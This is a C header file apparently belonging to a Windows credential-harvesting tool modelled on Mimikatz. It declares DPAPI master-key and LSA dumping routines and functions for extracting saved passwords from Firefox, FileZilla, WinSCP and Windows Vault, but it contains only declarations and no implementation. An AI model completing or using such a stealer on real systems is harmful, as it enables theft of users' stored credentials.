#pragma once

#define WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <windows.h>
#include <Wincrypt.h>
#include <bcrypt.h>
#include <Shlobj.h>
#include <ntstatus.h>
#include <NTSecAPI.h>
#include <Shlwapi.h>
#include <userenv.h>
#include <sddl.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib , "bcrypt.lib")
#pragma comment (lib, "Shlwapi.lib")
#pragma comment (lib, "userenv.lib")
#pragma comment (lib, "advapi32.lib")
#pragma comment (lib, "user32.lib")

#define RtlEqualGuid(L1, L2) (RtlEqualMemory(L1, L2, sizeof(GUID)))
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define KIWI_MINIMUM(a,b) (((a) < (b)) ? (a) : (b))
#define SHA_DIGEST_LENGTH	20

typedef STRING ANSI_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;
typedef const BYTE* LPCBYTE;
typedef VOID(NTAPI LSA_PROTECT_MEMORY)( PVOID Buffer, ULONG BufferSize);
typedef LSA_PROTECT_MEMORY* PLSA_PROTECT_MEMORY;
NTSTATUS WINAPI RtlAdjustPrivilege(IN ULONG Privilege, IN BOOL Enable, IN BOOL CurrentThread, OUT PULONG pPreviousState);

typedef HRESULT (WINAPI *SHGetFolderPathA_)(HWND   hwnd,int    csidl,HANDLE hToken,DWORD  dwFlags,LPSTR  pszPath);
typedef NTSTATUS (WINAPI* RtlStringFromGUID_)(REFGUID  Guid, PUNICODE_STRING GuidString);
typedef VOID (WINAPI* RtlFreeUnicodeString_)(PUNICODE_STRING UnicodeString);

typedef struct _GENERICKEY_BLOB {
	BLOBHEADER Header;
	DWORD dwKeyLen;
} GENERICKEY_BLOB, *PGENERICKEY_BLOB;

#pragma pack(push, 4) 
typedef struct _KULL_M_DPAPI_BLOB {
	DWORD	dwVersion;
	GUID	guidProvider;
	DWORD	dwMasterKeyVersion;
	GUID	guidMasterKey;
	DWORD	dwFlags;

	DWORD	dwDescriptionLen;
	PWSTR	szDescription;

	ALG_ID	algCrypt;
	DWORD	dwAlgCryptLen;

	DWORD	dwSaltLen;
	PBYTE	pbSalt;

	DWORD	dwHmacKeyLen;
	PBYTE	pbHmackKey;

	ALG_ID	algHash;
	DWORD	dwAlgHashLen;

	DWORD	dwHmac2KeyLen;
	PBYTE	pbHmack2Key;

	DWORD	dwDataLen;
	PBYTE	pbData;

	DWORD	dwSignLen;
	PBYTE	pbSign;
} KULL_M_DPAPI_BLOB, *PKULL_M_DPAPI_BLOB;
#pragma pack(pop) 

SHGetFolderPathA_ SHGetFolderPath_A;
RtlStringFromGUID_ RtlStringFromGUID;
RtlFreeUnicodeString_ myRtlFreeUnicodeString;

//declaration
HMODULE shell32_address;
DATA_BLOB Output;
DWORD domain_pvk_size;
char* programdata_path, *domain_pvk_buf;

//exports
int get_path(char* ret, int id);
char* string_remove_substring (char* String, const char* Substring);
char* string_terminate_string (char* String, int Character);
void string_wprintf_hex (LPCVOID lpData, DWORD cbData, DWORD flags);
int free_nss(void* key_slot);
char* my_strstr(const char* str, const char* substring);
size_t my_strlen(const char* str);
char* my_strcat(char* dest, const char* source);
void my_memcpy(char* dest, const char* src, unsigned int len);
int my_strcmp(const char* s1, const char* s2);
void my_memset(void* dest, int val, size_t len);
void* my_heapalloc(size_t Size);
void my_heapfree(void* mem);
void chararray_to_bytearray(char* Char, BYTE* Byte, DWORD Length);
unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length);
void my_sprintf(char* buf, const char* fmt, ...);
int dpapi_unprotect(void* data, BYTE* masterkey, DWORD masterkey_len);
int firefox_passwords(const char* master_pass);

char* kuhl_m_dpapi_masterkey(const char* szIn, DWORD* output_len);
NTSTATUS kuhl_m_sekurlsa_dpapi();
int kuhl_m_lsadump_bkey(LPWSTR cmdline);
int filezilla_passwords();
int winscp_passwords();
int get_vault_creds();

	extern BOOL ReadTable(const char* tableName);
	extern BYTE* GetValue(int rowNum, int field, DWORD* size);
	extern int GetRowCount();
	extern BOOL SqlHandler(LPCWSTR stringPath);
	extern void SqlHandleFree();
